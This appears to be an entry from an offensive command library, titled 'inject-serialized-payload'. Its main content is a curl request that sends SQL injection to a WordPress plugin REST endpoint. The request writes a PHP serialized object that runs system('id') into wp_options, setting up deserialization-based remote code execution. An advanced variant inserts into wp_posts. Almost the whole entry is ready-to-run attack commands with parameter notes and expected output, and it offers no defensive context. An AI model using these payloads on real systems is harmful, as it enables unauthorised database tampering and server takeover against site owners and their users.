---
data: >-
  curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d
  'param=\' ; UPDATE wp_options SET
  option_value=\'O:8:\"stdClass\":1:{s:4:\"exec\";s:14:\"system(\\\"id\\\")\";}\'
  WHERE option_name=\'vulnerable_option\' --' -H 'Content-Type:
  application/json'
tags:
  - deserialization
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.385Z'
id: 22fd641e-c3ed-4dd3-ad4e-a2eb6ebf49b9
verified: false
validated: true
submitted: true
---
# inject-serialized-payload

## Command

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' ; UPDATE wp_options SET option_value=\'O:8:\"stdClass\":1:{s:4:\"exec\";s:14:\"system(\\\"id\\\")\";}\' WHERE option_name=\'vulnerable_option\' --' -H 'Content-Type: application/json'
```

## Description

This command injects a malicious PHP serialized payload into the database using SQLi to set up deserialization-based RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d 'param=...'` | SQL UPDATE with serialized gadget | Yes |
| `WHERE` clause | Targets specific table/column | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' ; UPDATE wp_options SET option_value=... --' -H 'Content-Type: application/json'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' ; INSERT INTO wp_posts (post_content) VALUES (\'malicious_serialized\') --' -H 'Content-Type: application/json'
```

## Expected Output

Database update success, e.g., no error and confirmation of rows affected.

## Related

- [[Related Procedure: Chain-SQLi-with-Insecure-Deserialization-for-RCE]]
